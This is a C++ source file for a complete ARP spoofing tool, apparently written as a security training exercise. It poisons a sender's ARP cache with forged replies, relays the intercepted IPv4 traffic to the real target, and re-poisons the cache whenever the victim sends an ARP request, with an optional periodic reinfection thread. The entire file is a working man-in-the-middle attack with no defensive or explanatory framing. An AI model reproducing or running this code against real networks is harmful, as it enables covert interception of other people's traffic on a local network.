#include <bits/stdc++.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
using namespace std;

//reinfection value
#define ENABLE_PERIODIC_REINFECTION 0
#define REINFECTION_PERIOD 5

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Connection {
    Ip sender_ip;
    Ip target_ip;
    Mac sender_mac;
    Mac target_mac;
};

struct IpHdr final {
	uint8_t vhl, tos;
	uint16_t len, id, off;
	uint8_t ttl, p;
	uint16_t sum;
	uint32_t sip_, dip_;

	Ip sip() const { return Ip(ntohl(sip_)); }
	Ip dip() const { return Ip(ntohl(dip_)); }
};


void usage() {
    printf("syntax : arp-spoofing <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : arp-spoofing wlan0 192.168.10.2 192.168.10.1\n");
}

string get_attacker_mac(const string &name) {
    ifstream mac_file("/sys/class/net/" + name + "/address");
    if (!mac_file.is_open()) {
        perror("MAC file open error");
        exit(-1);
    }
    string res;
    mac_file >> res;
    return res;
}

string get_attacker_ip(const string &name) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("Socket open error");
        exit(-1);
    }
    ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, name.c_str(), IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl error");
        exit(-1);
    }
    sockaddr_in* sock_in = (sockaddr_in*)&ifr.ifr_addr;
    return inet_ntoa(sock_in->sin_addr);
}

EthArpPacket make_arp_packet(const Mac& eth_smac, const Mac& eth_dmac,
                             const Mac& arp_smac, const Mac& arp_tmac,
                             const Ip& sip, const Ip& tip,
                             bool is_request) {
    EthArpPacket packet;
    packet.eth_.smac_ = eth_smac;
    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(is_request ? ArpHdr::Request : ArpHdr::Reply);
    packet.arp_.smac_ = arp_smac;
    packet.arp_.tmac_ = arp_tmac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tip_ = htonl(tip);
    return packet;
}

bool send_arp_packet(pcap_t* handle, const EthArpPacket& packet) {
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
        return false;
    }
    return true;
}

Mac get_mac_by_arp(pcap_t* handle, const string& attacker_mac, const string& attacker_ip, const string& target_ip) {
    Mac broadcast("ff:ff:ff:ff:ff:ff");
    Mac null_mac("00:00:00:00:00:00");

    EthArpPacket req = make_arp_packet(
        Mac(attacker_mac), broadcast,
        Mac(attacker_mac), null_mac,
        Ip(attacker_ip), Ip(target_ip),
        true
    );

    send_arp_packet(handle, req);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

        EthHdr* eth = (EthHdr*)pkt;
        if (ntohs(eth->type_) != EthHdr::Arp) continue;

        ArpHdr* arp = (ArpHdr*)(pkt + sizeof(EthHdr));
        if (ntohs(arp->op_) != ArpHdr::Reply) continue;
        if (ntohl(arp->sip_) != Ip(target_ip)) continue;
        if (ntohl(arp->tip_) != Ip(attacker_ip)) continue;

        return arp->smac();
    }

    fprintf(stderr, "ARP reply not received for %s\n", target_ip.c_str());
    exit(-1);
}

struct ReinfectArgs {
    pcap_t* handle;
    vector<Connection>* connections;
    Mac attacker_mac;
};

void* reinfect_loop(void* arg) {
    ReinfectArgs* args = (ReinfectArgs*)arg;
    while (true) {
        sleep(REINFECTION_PERIOD);
        for (const auto& conn : *(args->connections)) {
            EthArpPacket reinfect = make_arp_packet(
                args->attacker_mac, conn.sender_mac,
                args->attacker_mac, conn.sender_mac,
                conn.target_ip, conn.sender_ip,
                false
            );
            send_arp_packet(args->handle, reinfect);
            std::cout << "[*] Periodic Reinfected: sender "
          << conn.sender_ip << " -> target "
          << conn.target_ip << std::endl;
        }
    }
    return nullptr;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2 != 0)) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    string attacker_mac = get_attacker_mac(dev);
    string attacker_ip = get_attacker_ip(dev);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    vector<Connection> connections;
    for (int i = 2; i + 1 < argc; i += 2) {
        string sender_ip = argv[i];
        string target_ip = argv[i + 1];

        Connection conn;
        conn.sender_ip = Ip(sender_ip);
        conn.target_ip = Ip(target_ip);
        conn.sender_mac = get_mac_by_arp(handle, attacker_mac, attacker_ip, sender_ip);
        conn.target_mac = get_mac_by_arp(handle, attacker_mac, attacker_ip, target_ip);

        // 초기에 감염
        EthArpPacket spoof = make_arp_packet(
            Mac(attacker_mac), conn.sender_mac,
            Mac(attacker_mac), conn.sender_mac,
            conn.target_ip, conn.sender_ip,
            false
        );
        send_arp_packet(handle, spoof);

        connections.push_back(conn);
    }

    #if ENABLE_PERIODIC_REINFECTION
        ReinfectArgs* args = new ReinfectArgs{handle, &connections, Mac(attacker_mac)};
        pthread_t tid;
        pthread_create(&tid, nullptr, reinfect_loop, args);
    #endif

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

        EthHdr* eth = (EthHdr*)packet;
        if (ntohs(eth->type_) == EthHdr::Ip4) {
            IpHdr* ip = (IpHdr*)(packet + sizeof(EthHdr));

            for (auto& conn : connections) {
                if (ip->sip() == conn.sender_ip && ip->dip() == conn.target_ip) {
                    u_char* relay = new u_char[header->caplen];
                    memcpy(relay, packet, header->caplen);
                    EthHdr* relay_eth = (EthHdr*)relay;
                    relay_eth->smac_ = Mac(attacker_mac);
                    relay_eth->dmac_ = conn.target_mac;

                    pcap_sendpacket(handle, relay, header->caplen);
                    delete[] relay;
                }
            }
        }
        else if (ntohs(eth->type_) == EthHdr::Arp) {
            ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
            uint16_t op = ntohs(arp->op_);
            Ip sip = ntohl(arp->sip_);
            Ip tip = ntohl(arp->tip_);

            for (auto& conn : connections) {
                // sender가 target을 묻는 ARP Request
                if (op == ArpHdr::Request && sip == conn.sender_ip && tip == conn.target_ip) {
                    EthArpPacket reinfect = make_arp_packet(
                        Mac(attacker_mac), conn.sender_mac,
                        Mac(attacker_mac), conn.sender_mac,
                        conn.target_ip, conn.sender_ip,
                        false
                    );
                    send_arp_packet(handle, reinfect);
                    cout << "[*] Re-infection triggered: sender " << conn.sender_ip << " -> target " << conn.target_ip << '\n';
                }
            }
        }
    }

    pcap_close(handle);
    return 0;
}
